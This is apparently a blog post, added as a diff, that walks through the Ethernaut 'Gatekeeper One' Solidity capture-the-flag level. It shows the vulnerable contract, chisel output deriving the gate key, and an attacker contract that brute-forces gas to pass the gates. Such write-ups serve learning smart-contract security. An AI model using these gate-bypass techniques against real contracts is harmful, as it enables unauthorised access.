@@ -1,0 +1,115 @@
+---
+title: Ethernaut - Gatekeeper One - Solution
+date: '2024-05-31'
+tags: ['security', 'solidity', 'ctfs']
+draft: false
+summary: Solution to the Ethernaut - Gatekeeper One CTF
+---
+
+# Ethernaut - Gatekeeper One - Solution
+
+## Contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract GatekeeperOne {
+    address public entrant;
+
+    modifier gateOne() {
+        require(msg.sender != tx.origin);
+        _;
+    }
+
+    modifier gateTwo() {
+        require(gasleft() % 8191 == 0);
+        _;
+    }
+
+    modifier gateThree(bytes8 _gateKey) {
+        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
+        _;
+    }
+
+    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+        entrant = tx.origin;
+        return true;
+    }
+}
+```
+
+## Solution
+
+The goal of this level is to register yourself as an `entrant`.
+
+To pass `gateOne()`, we need to call `enter()` from a contract rather than from our EOA.
+
+To pass `gateTwo()`, we need to forward a very specific amount of gas during the call to `enter()` such that the `gasleft()` when entering `gateTwo()` is a multiple of 8191.
+While we could reverse-engineer this gas amount using, e.g., the Remix debugger, it's easier to simply bruteforce our way in, forwarding a different amount of gas with each try.
+
+To pass `gateThree()`, let's take a closer look at the three `require` statements, starting with part 3:
+Suppose our player address is 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4.
+Using chisel, we can then see that the right-hand side of part 3 evaluates to:
+```
+➜ address player = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
+➜ uint16(uint160(player))
+Type: uint16
+├ Hex: 0xddc4
+├ Hex (full word): 0x000000000000000000000000000000000000000000000000000000000000ddc4
+└ Decimal: 56772
+ ```
+
+ Part 3 requires this to be equal to the full word of `uint32(uint64(_gateKey))`.
+ In other words, the last 4 bytes of our `_gateKey` should be 0000ddc4.
+
+ Part 2 tells us that at least one character of the first 4 bytes of our `_gateKey` must not be zero.
+ See, for example:
+
+```
+➜ bytes8 key = 0x5931b4ed56ace4c4;
+➜ uint64(key)
+Type: uint64
+├ Hex: 0x5931b4ed56ace4c4
+├ Hex (full word): 0x0000000000000000000000000000000000000000000000005931b4ed56ace4c4
+└ Decimal: 6427117074688828612
+➜ uint32(uint64(key))
+Type: uint32
+├ Hex: 0x56ace4c4
+├ Hex (full word): 0x0000000000000000000000000000000000000000000000000000000056ace4c4
+└ Decimal: 1454171332
+```
+
+Finally, part 1 tells us that the last 4 bytes must be of the form 0000xxxx, where "xxxx" can be two arbitrary bytes. 
+Notice that this is a similar requirement to part 3, but is actually less restrictive, since part 3 constraints those last two bytes to be exactly the last two bytes of our player's account address.
+In that sense, the level's contraints would stay exactly the same, even if part 1 were deleted.
+
+As a conclusion, one possible `_gateKey` is 0x1234abcd0000ddc4, assuming that our player address is 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4.
+
+With this information, we can solve the challenge using the following attacker:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract GatekeeperOneAttacker {
+    address public immutable VICTIM;
+
+    constructor(address victim) {
+        VICTIM = victim;
+    }
+
+    function attack(bytes8 gateKey) external {
+        for (uint256 i; i < 8191; i++) {
+            (bool success, ) = VICTIM.call{gas: i + 5 * 8191}(abi.encodeWithSignature("enter(bytes8)", gateKey));
+            if (success) {
+                break;
+            }
+        }
+    }
+}
+```
+
+In the above contract, notice that we added a sufficiently high multiple of 8191 to our forwarded amount of gas so that we ensure that there's sufficient gas to execute the entire function call.
